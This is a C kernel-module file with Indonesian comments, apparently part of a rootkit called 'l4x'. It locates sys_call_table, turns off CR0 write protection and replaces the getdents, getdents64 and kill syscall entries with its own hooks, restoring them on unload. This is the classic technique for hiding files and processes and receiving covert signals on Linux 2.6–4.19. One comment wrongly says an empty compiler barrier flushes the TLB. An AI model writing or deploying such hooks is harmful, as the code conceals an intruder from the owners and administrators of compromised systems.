/*
 * syscall_hook.c — cari & ganti entri sys_call_table (khas era2.6–4.19).
 *
 * Mekanisme:
 *   1. kallsyms_lookup_name MASIH diekspor di era ini (mati di5.7)
 *   2. sys_call_table di memori read-only (STRICT_KERNEL_RWX sejak ~4.11)
 *      -> turunkan CR0.WP sebentar, tulis, naikkan lagi
 *   3. Simpan fungsi asli -> saat exit PASANG KEMBALI (unload bersih)
 *
 * Dua konvensi signature (L4X_OLD_ARGS, lihat kver.h) ditangani di sini:
 * tipe penyimpan & pemanggil asli berbeda, tapi pemasangan tabel sama.
 */
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/errno.h>
#include <linux/printk.h>
#include <linux/preempt.h>
#include "kver.h"
#include "l4x.h"

#define CR0_WP_BIT   (1UL << 16)

static unsigned long *g_table;             /* alamat sys_call_table */

#if L4X_OLD_ARGS
typedef long (*l4x_fn_gd)(unsigned int, char __user *, unsigned int);
typedef long (*l4x_fn_kill)(int, int);
static l4x_fn_gd    g_orig_gd;
static l4x_fn_gd    g_orig_getdents;
static l4x_fn_kill g_orig_kill;

long l4x_call_orig_getdents64(unsigned int fd, char __user *dirp, unsigned int count)
{
	return g_orig_gd(fd, dirp, count);
}
long l4x_call_orig_getdents(unsigned int fd, char __user *dirp, unsigned int count)
{
	return g_orig_getdents(fd, dirp, count);
}
long l4x_call_orig_kill(int pid, int sig)
{
	return g_orig_kill(pid, sig);
}
#else
typedef long (*l4x_fn_ptregs)(const struct pt_regs *);
static l4x_fn_ptregs g_orig_getdents64;
static l4x_fn_ptregs g_orig_getdents;
static l4x_fn_ptregs g_orig_kill;

long l4x_call_orig_getdents64(const struct pt_regs *regs)
{
	return g_orig_getdents64(regs);
}
long l4x_call_orig_getdents(const struct pt_regs *regs)
{
	return g_orig_getdents(regs);
}
long l4x_call_orig_kill(const struct pt_regs *regs)
{
	return g_orig_kill(regs);
}
#endif

static inline void cr0_wp_set(bool on)
{
	unsigned long cr0;

	asm volatile("mov %%cr0,%0" : "=r"(cr0));
	if (on)
		cr0 |= CR0_WP_BIT;
	else
		cr0 &= ~CR0_WP_BIT;
	asm volatile("mov %0,%%cr0" : : "r"(cr0) : "memory");
}

int l4x_hooks_init(void)
{
	unsigned long addr;

	addr = kallsyms_lookup_name("sys_call_table");
	if (!addr) {
		pr_err("l4x: sys_call_table tak ditemukan\n");
		return -ENOENT;
	}
	g_table = (unsigned long *)addr;

#if L4X_OLD_ARGS
	g_orig_gd       = (l4x_fn_gd)g_table[__NR_getdents64];
	g_orig_getdents = (l4x_fn_gd)g_table[__NR_getdents];
	g_orig_kill     = (l4x_fn_kill)g_table[__NR_kill];
	if (!g_orig_gd || !g_orig_getdents || !g_orig_kill) {
		pr_err("l4x: entri syscall asli tidak valid\n");
		g_table = NULL;
		return -ENOENT;
	}
#else
	g_orig_getdents64 = (l4x_fn_ptregs)g_table[__NR_getdents64];
	g_orig_getdents   = (l4x_fn_ptregs)g_table[__NR_getdents];
	g_orig_kill       = (l4x_fn_ptregs)g_table[__NR_kill];
	if (!g_orig_getdents64 || !g_orig_getdents || !g_orig_kill) {
		pr_err("l4x: entri syscall asli tidak valid\n");
		g_table = NULL;
		return -ENOENT;
	}
#endif

	preempt_disable();
	cr0_wp_set(false);
	g_table[__NR_getdents64] = (unsigned long)l4x_sys_getdents64;
	g_table[__NR_getdents]   = (unsigned long)l4x_sys_getdents;
	g_table[__NR_kill]       = (unsigned long)l4x_sys_kill;
	cr0_wp_set(true);
	preempt_enable();
	asm volatile("" ::: "memory");   /* dorong perubahan ke TLB */

	pr_info("l4x: sys_call_table dipasang (getdents + getdents64 + kill)\n");
	return 0;
}

void l4x_hooks_exit(void)
{
	if (!g_table)
		return;
	preempt_disable();
	cr0_wp_set(false);
#if L4X_OLD_ARGS
	g_table[__NR_getdents64] = (unsigned long)g_orig_gd;
	g_table[__NR_getdents]   = (unsigned long)g_orig_getdents;
	g_table[__NR_kill]       = (unsigned long)g_orig_kill;
#else
	g_table[__NR_getdents64] = (unsigned long)g_orig_getdents64;
	g_table[__NR_getdents]   = (unsigned long)g_orig_getdents;
	g_table[__NR_kill]       = (unsigned long)g_orig_kill;
#endif
	cr0_wp_set(true);
	preempt_enable();
	g_table = NULL;
	pr_info("l4x: sys_call_table dikembalikan (unload bersih)\n");
}
